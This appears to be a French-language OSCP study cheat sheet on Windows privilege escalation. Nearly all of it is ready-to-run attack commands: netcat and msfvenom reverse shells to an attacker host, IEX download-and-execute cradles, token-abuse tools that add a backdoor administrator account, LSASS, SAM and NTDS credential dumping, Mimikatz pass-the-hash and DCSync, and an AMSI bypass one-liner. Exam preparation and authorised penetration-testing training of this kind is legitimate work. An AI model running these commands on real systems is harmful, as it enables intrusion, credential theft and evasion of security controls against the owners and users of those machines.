# 02 — Windows Privesc (Complet)

## 0. Réflexe immédiat après foothold

```powershell
whoami
whoami /all                        # CRITIQUE — privs + groupes
whoami /priv
whoami /groups
systeminfo
hostname
ipconfig /all
net user
net localgroup administrators
```

---

## 1. Énumération automatique

```bash
# Depuis Kali — serveur HTTP
python3 -m http.server 80

# Transférer WinPEAS
certutil -urlcache -split -f http://<KALI>/winPEASx64.exe winpeas.exe
iwr -uri http://<KALI>/winPEASx64.exe -outfile winpeas.exe

# Lancer
.\winPEASx64.exe
.\winPEASx64.exe quiet
.\winPEASx64.exe systeminfo
.\winPEASx64.exe windowscreds
```

> 🔴 **Dans la sortie WinPEAS** : focus sur les éléments en rouge/jaune
> Sections prioritaires : **Privileges, Services, Scheduled Tasks, Credentials**

---

## 2. Privileges — Décision immédiate

### Tableau de décision

| Privilege | Impact | Exploitation |
|---|---|---|
| **SeImpersonatePrivilege** | SYSTEM | GodPotato, PrintSpoofer |
| **SeAssignPrimaryTokenPrivilege** | SYSTEM | GodPotato |
| **SeBackupPrivilege** | Lire tout | Dump SAM/NTDS |
| **SeRestorePrivilege** | Écrire tout | DLL Hijack arbitraire |
| **SeDebugPrivilege** | Dump LSASS | Mimikatz |
| **SeTakeOwnershipPrivilege** | Prendre propriété | Modifier fichiers système |
| **SeLoadDriverPrivilege** | Kernel | Charger driver malveillant |

---

### SeImpersonatePrivilege → GodPotato

> Très fréquent sur IIS, MSSQL, services web tournant en Network Service

```powershell
# Vérifier
whoami /priv | findstr "SeImpersonate"

# GodPotato — le plus fiable
.\GodPotato.exe -cmd "whoami"
.\GodPotato.exe -cmd "cmd /c net user hacker Password123! /add"
.\GodPotato.exe -cmd "cmd /c net localgroup administrators hacker /add"
.\GodPotato.exe -cmd "cmd /c .\nc.exe <KALI> 4444 -e cmd"

# PrintSpoofer — alternative si GodPotato échoue
.\PrintSpoofer.exe -i -c cmd
.\PrintSpoofer.exe -c "nc.exe <KALI> 4444 -e cmd"

# JuicyPotato — vieux systèmes (Windows 2016 et avant)
.\JuicyPotato.exe -l 1337 -p cmd.exe -a "/c net user hacker Password123! /add" -t *
# Nécessite un CLSID valide : https://github.com/ohpe/juicy-potato/tree/master/CLSID
```

---

### SeBackupPrivilege → Dump SAM / NTDS

```powershell
# Méthode 1 — reg save
reg save HKLM\SAM C:\Temp\sam.bak
reg save HKLM\SYSTEM C:\Temp\system.bak
reg save HKLM\SECURITY C:\Temp\security.bak
# Depuis Kali :
secretsdump.py -sam sam.bak -system system.bak -security security.bak LOCAL

# Méthode 2 — Volume Shadow Copy
wmic shadowcopy call create Volume='C:\'
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\
# Depuis Kali :
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

---

### SeDebugPrivilege → Dump LSASS

```powershell
# Méthode 1 — Comsvcs.dll (built-in, pas d'outil externe)
Get-Process lsass                                 # récupérer le PID
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\Temp\lsass.dmp full

# Méthode 2 — ProcDump (signé Microsoft)
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Depuis Kali — analyser le dump
pypykatz lsa minidump lsass.dmp
# Ou via Mimikatz :
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

---

## 3. Services mal configurés

### Unquoted Service Path

```powershell
# Lister les services vulnérables
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows" | findstr /i /v '\"'

# Vérifier les permissions en écriture sur les dossiers du path
icacls "C:\Program Files\Vulnerable App"
# Si BUILTIN\Users:(W) ou (F) → vulnérable

# Exemple : C:\Program Files\My App\service.exe
# Windows cherche dans l'ordre :
# C:\Program.exe         ← placer ici si droits
# C:\Program Files\My.exe
# C:\Program Files\My App\service.exe

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f exe -o "My.exe"
copy My.exe "C:\Program Files\My.exe"
sc stop <service> && sc start <service>
```

### Permissions sur le binaire du service

```powershell
# Vérifier chaque binaire de service
icacls "C:\path\to\service.exe"
# Cherche : BUILTIN\Users:(F) ou (W) ou Everyone:(F)

# Si modifiable → remplacer par payload
copy evil.exe "C:\path\to\service.exe"
sc stop <service> && sc start <service>
```

### Permissions sur le registre du service

```powershell
Get-Acl HKLM:\System\CurrentControlSet\Services\<service> | Format-List
# Si modifiable → changer le binaire pointé
reg add HKLM\System\CurrentControlSet\Services\<service> /t REG_EXPAND_SZ /v ImagePath /d "C:\Temp\evil.exe" /f
sc stop <service> && sc start <service>
```

---

## 4. Tâches planifiées

```powershell
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v | findstr /i "task name\|run as\|command\|status"

# Cherche :
# - Tâche qui tourne en SYSTEM
# - Avec script/binaire que tu peux modifier

icacls C:\path\to\script.bat
# Si modifiable :
echo C:\Temp\nc.exe <KALI> 4444 -e cmd >> C:\path\to\script.bat
```

---

## 5. AlwaysInstallElevated

```powershell
# Vérifier les deux clés (doivent être à 1)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Si les deux = 1
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

---

## 6. DLL Hijacking

```powershell
# Ordre de recherche DLL par Windows :
# 1. Dossier de l'application   ← souvent modifiable
# 2. C:\Windows\System32
# 3. C:\Windows\System
# 4. C:\Windows
# 5. Dossiers dans %PATH%

# Identifier une DLL manquante dans un dossier modifiable
# (Procmon en lab, ou via WinPEAS)

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f dll -o missing.dll
copy missing.dll "C:\path\to\app\"
# Relancer l'application ou le service
```

---

## 7. Credentials dans le système

### Fichiers courants

```powershell
# Recherche globale
dir /s /b *pass* *cred* *secret* *config* *vnc* *.config 2>nul
findstr /si "password" *.txt *.xml *.ini *.config *.yml 2>nul

# Emplacements spécifiques
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattend\Unattend.xml
type C:\Windows\system32\sysprep\sysprep.xml
type C:\inetpub\wwwroot\web.config
type C:\xampp\htdocs\config.php
dir C:\Users\*\AppData\Roaming\FileZilla\
```

### Registry

```powershell
# AutoLogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
# Cherche : DefaultUsername, DefaultPassword

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKCU\Software\TightVNC\Server"

# PuTTY sessions
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s

# Recherche générique
reg query HKLM /f password /t REG_SZ /s 2>nul
reg query HKCU /f password /t REG_SZ /s 2>nul
```

### Windows Credential Manager

```powershell
cmdkey /list
# Si creds disponibles → runas /savecred
runas /savecred /user:<domain>\<user> "cmd.exe /c nc.exe <KALI> 4444 -e cmd"
```

---

## 8. Mimikatz

```powershell
.\mimikatz.exe
privilege::debug
token::elevate

# Dump credentials mémoire
sekurlsa::logonpasswords

# Dump hashes SAM
lsadump::sam

# Dump secrets LSA
lsadump::secrets

# Pass-the-Hash avec Mimikatz
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:cmd.exe

# DCSync (si droits suffisants)
lsadump::dcsync /domain:<domain> /user:Administrator
lsadump::dcsync /domain:<domain> /all /csv
```

---

## 9. Bypass défenses

### PowerShell ExecutionPolicy

```powershell
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<KALI>/script.ps1')"
```

### AMSI Bypass

```powershell
# À exécuter avant les outils qui se font bloquer
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Téléchargement alternatif si IWR bloqué

```powershell
(New-Object System.Net.WebClient).DownloadFile('http://<KALI>/file', 'C:\Temp\file')
certutil -urlcache -split -f http://<KALI>/file C:\Temp\file
bitsadmin /transfer job http://<KALI>/file C:\Temp\file
```

---

## 10. Proof — Screenshots obligatoires

```powershell
# Screenshot avec TOUT ça visible sur l'écran
whoami
hostname
ipconfig
type C:\Users\<user>\Desktop\local.txt
type C:\Users\Administrator\Desktop\proof.txt
```

---

## Tags
#oscp #windows #privesc #seimpersonate #godpotato #mimikatz
